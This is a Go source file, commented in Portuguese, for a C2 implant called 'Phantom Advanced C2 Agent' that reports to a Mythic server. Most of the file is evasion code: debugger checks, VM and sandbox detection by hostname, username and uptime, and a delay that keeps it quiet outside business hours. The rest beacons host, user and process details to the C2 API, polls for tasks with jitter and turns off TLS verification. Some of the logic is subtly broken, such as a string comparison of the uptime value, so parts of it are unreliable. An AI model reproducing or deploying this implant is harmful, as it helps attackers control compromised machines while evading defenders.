package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

// Configurações globais
var (
    mythicURL = "https://127.0.0.1:7443"
    username  = "mythic_admin"
    password  = ""
    uuid      = generateUUID()
)

// Estruturas para API do Mythic
type LoginRequest struct {
    Username string `json:"username"`
    Password string `json:"password"`
}

type LoginResponse struct {
    Status      string `json:"status"`
    AccessToken string `json:"access_token"`
}

type CheckinRequest struct {
    UUID         string `json:"uuid"`
    User         string `json:"user"`
    Host         string `json:"host"`
    PID          int    `json:"pid"`
    IP           string `json:"ip"`
    ExternalIP   string `json:"external_ip"`
    ProcessName  string `json:"process_name"`
    Description  string `json:"description"`
    Domain       string `json:"domain"`
    OS           string `json:"os"`
    Architecture string `json:"architecture"`
    PayloadType  string `json:"payload_type"`
}

// Técnicas de evasão básicas
func antiDebugCheck() bool {
    // Verificação básica de debugger (Linux)
    if runtime.GOOS == "linux" {
        status, err := ioutil.ReadFile("/proc/self/status")
        if err == nil {
            statusStr := string(status)
            if strings.Contains(statusStr, "TracerPid:\t0") {
                return false // Não há debugger
            }
            return true // Debugger detectado
        }
    }
    return false
}

func vmDetection() bool {
    // Verificação de VM através de artefatos do sistema
    vmFiles := []string{
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/proc/cpuinfo",
    }
    
    for _, path := range vmFiles {
        if data, err := ioutil.ReadFile(path); err == nil {
            content := strings.ToLower(string(data))
            indicators := []string{"vmware", "virtualbox", "qemu", "kvm", "xen", "hyper-v", "virtual"}
            
            for _, indicator := range indicators {
                if strings.Contains(content, indicator) {
                    return true
                }
            }
        }
    }
    
    // Verificação de hostname suspeito
    hostname, _ := os.Hostname()
    hostname = strings.ToLower(hostname)
    suspiciousNames := []string{"sandbox", "analysis", "malware", "virus", "test"}
    
    for _, name := range suspiciousNames {
        if strings.Contains(hostname, name) {
            return true
        }
    }
    
    return false
}

func sandboxEvasion() bool {
    // Verificação de usuários típicos de sandbox
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    user = strings.ToLower(user)
    
    sandboxUsers := []string{"sandbox", "malware", "virus", "sample", "test"}
    for _, sbUser := range sandboxUsers {
        if strings.Contains(user, sbUser) {
            return true
        }
    }
    
    // Verificação de tempo de uptime mínimo
    uptime, err := ioutil.ReadFile("/proc/uptime")
    if err == nil {
        uptimeStr := strings.Fields(string(uptime))[0]
        if uptimeStr < "600" { // Menos de 10 minutos
            return true
        }
    }
    
    return false
}

func temporalEvasion() {
    // Só opera em horário comercial (evasão temporal)
    now := time.Now()
    hour := now.Hour()
    weekday := now.Weekday()
    
    // Verificar se é horário comercial (9h-17h, segunda-sexta)
    if weekday == time.Saturday || weekday == time.Sunday || hour < 9 || hour > 17 {
        // Dormir até horário comercial
        sleepTime := time.Duration(30+rand.Intn(60)) * time.Minute
        fmt.Printf("[!] Fora do horário comercial. Dormindo por %v\n", sleepTime)
        time.Sleep(sleepTime)
    }
}

func main() {
    rand.Seed(time.Now().UnixNano())
    
    fmt.Println("[+] Phantom Advanced C2 Agent")
    fmt.Println("[+] Iniciando verificações de evasão...")
    
    // Verificações de evasão
    if antiDebugCheck() {
        fmt.Println("[-] Debugger detectado. Encerrando.")
        os.Exit(0)
    }
    
    if vmDetection() {
        fmt.Println("[!] Ambiente virtualizado detectado. Aplicando delay...")
        time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
    }
    
    if sandboxEvasion() {
        fmt.Println("[-] Ambiente suspeito detectado. Encerrando.")
        os.Exit(0)
    }
    
    // Evasão temporal
    temporalEvasion()
    
    fmt.Println("[+] Verificações concluídas. Iniciando operação...")
    
    // Obter senha do Mythic
    password = getMythicPassword()
    if password == "" {
        fmt.Println("[-] Não foi possível obter senha do Mythic")
        os.Exit(1)
    }
    
    // Login no Mythic
    token := login()
    if token == "" {
        fmt.Println("[-] Falha no login")
        os.Exit(1)
    }
    
    fmt.Printf("[+] Login realizado com sucesso. Token: %s...\n", token[:10])
    
    // Checkin inicial
    if !checkin(token) {
        fmt.Println("[-] Falha no checkin")
        os.Exit(1)
    }
    
    fmt.Println("[+] Checkin realizado com sucesso!")
    
    // Loop principal com jitter
    for {
        getTasks(token)
        sleepWithJitter()
    }
}

func getMythicPassword() string {
    // Tentar obter via mythic-cli
    cmd := exec.Command("/root/Mythic/mythic-cli", "config", "get", "admin_password")
    if output, err := cmd.Output(); err == nil {
        return strings.TrimSpace(string(output))
    }
    
    // Senha padrão para teste
    return "mythic_password"
}

func login() string {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }
    
    loginReq := LoginRequest{
        Username: username,
        Password: password,
    }
    
    jsonData, _ := json.Marshal(loginReq)
    
    resp, err := client.Post(mythicURL+"/auth", "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        fmt.Printf("[-] Erro no login: %v\n", err)
        return ""
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    
    var loginResp LoginResponse
    if err := json.Unmarshal(body, &loginResp); err != nil {
        fmt.Printf("[-] Erro ao fazer parse da resposta de login: %v\n", err)
        return ""
    }
    
    return loginResp.AccessToken
}

func checkin(token string) bool {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }
    
    hostname, _ := os.Hostname()
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    
    checkinReq := CheckinRequest{
        UUID:         uuid,
        User:         user,
        Host:         hostname,
        PID:          os.Getpid(),
        IP:           "127.0.0.1",
        ExternalIP:   "127.0.0.1",
        ProcessName:  "phantom",
        Description:  "Phantom C2 Agent",
        Domain:       "",
        OS:           runtime.GOOS,
        Architecture: runtime.GOARCH,
        PayloadType:  "apollo",
    }
    
    jsonData, _ := json.Marshal(checkinReq)
    
    req, _ := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
    req.Header.Set("Authorization", "Bearer "+token)
    req.Header.Set("Content-Type", "application/json")
    
    resp, err := client.Do(req)
    if err != nil {
        fmt.Printf("[-] Erro no checkin: %v\n", err)
        return false
    }
    defer resp.Body.Close()
    
    return resp.StatusCode == 200
}

func getTasks(token string) {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }
    
    req, _ := http.NewRequest("GET", mythicURL+"/api/v1.4/agent_message", nil)
    req.Header.Set("Authorization", "Bearer "+token)
    
    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    if len(body) > 0 {
        fmt.Printf("[+] Response: %s\n", string(body))
    }
}

func generateUUID() string {
    b := make([]byte, 16)
    for i := range b {
        b[i] = byte(rand.Intn(256))
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func sleepWithJitter() {
    base := 5 * time.Second
    jitter := time.Duration(rand.Intn(3000)) * time.Millisecond
    time.Sleep(base + jitter)
}